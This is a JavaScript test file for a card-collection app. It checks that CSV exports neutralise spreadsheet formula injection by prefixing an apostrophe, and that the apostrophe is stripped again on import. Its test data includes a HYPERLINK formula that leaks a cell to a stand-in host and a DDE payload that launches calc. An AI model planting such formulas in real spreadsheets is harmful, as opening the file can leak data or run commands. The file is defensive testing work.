// CSV exports neutralise spreadsheet formulas (SEC-11).
//
// A spreadsheet reads a cell starting with = + - @ (or a tab or carriage return)
// as a formula, and a formula can fetch URLs or run commands when the file is
// opened. Location names, card names and provider text reach these cells. Such a
// text value is now written with a leading apostrophe, which spreadsheets show as
// text; plain numbers are left alone; and the import strips the apostrophe again,
// so a Bindarr export still imports back as it was. Plain node + assert.
const assert = require('assert');
const { generateExportCSV, neutralizeCell } = require('../src/utils/csvExporters');
const { parseThirdPartyCSV } = require('../src/utils/csvMappers');

// --- the cell rule ---------------------------------------------------------------
for (const evil of ['=HYPERLINK("http://x.example/?leak="&A1)', '+2 Mace', '-1+1', '@SUM(A1)', '\t=cmd', '\r=cmd', '=1+1']) {
  assert.strictEqual(neutralizeCell(evil), `'${evil}`, `${JSON.stringify(evil)} is written as text`);
}
for (const fine of ['Pikachu', '-5', '+3.5', '42', 'Main Binder', '', 'a=b']) {
  assert.strictEqual(neutralizeCell(fine), fine, `${JSON.stringify(fine)} is left alone`);
}
for (const n of [-5, 0, 12.5]) assert.strictEqual(neutralizeCell(n), n, 'numbers are numbers');
console.log('PASS: formula-looking text gets an apostrophe; numbers and plain text do not');

// --- every export format ------------------------------------------------------------
const row = {
  card_id: 'mtg-afr-1', game: 'mtg', name: '+2 Mace', set_name: '=cmd|"/c calc"!A0', set_code: 'afr',
  collector_number: '1', rarity: 'Common', quantity: 1, condition: 'Near Mint', printing: 'Normal',
  language: 'English', purchase_price: 0.25, market_price: -0, location_name: '@Binder', added_at: '2026-01-01',
};
for (const format of ['internal', 'tcgplayer', 'dragonshield', 'manabox']) {
  const csv = generateExportCSV([row], format);
  const cells = csv.split('\n')[1];
  assert.ok(cells.includes(`"'+2 Mace"`), `${format}: the card name is neutralised`);
  assert.ok(!/(^|,)"[=+@-]/.test(cells), `${format}: no cell starts with a formula character: ${cells}`);
}
console.log('PASS: every export format neutralises its cells');

// --- and it imports back as it was ---------------------------------------------------
const csv = generateExportCSV([row], 'internal');
const [header, line] = csv.split('\n');
const split = (l) => l.match(/"((?:[^"]|"")*)"|[^,]+/g).map(c => c.replace(/^"|"$/g, '').replace(/""/g, '"'));
const record = Object.fromEntries(split(header).map((h, i) => [h, split(line)[i]]));
const [item] = parseThirdPartyCSV([record], 'internal');
assert.strictEqual(item.name, '+2 Mace', 'the apostrophe is not part of the name');
assert.strictEqual(item.set_name, '=cmd|"/c calc"!A0', 'nor of any other value');
console.log('PASS: an export imports back without the apostrophes');

console.log('PASS: csvformula.test.js');
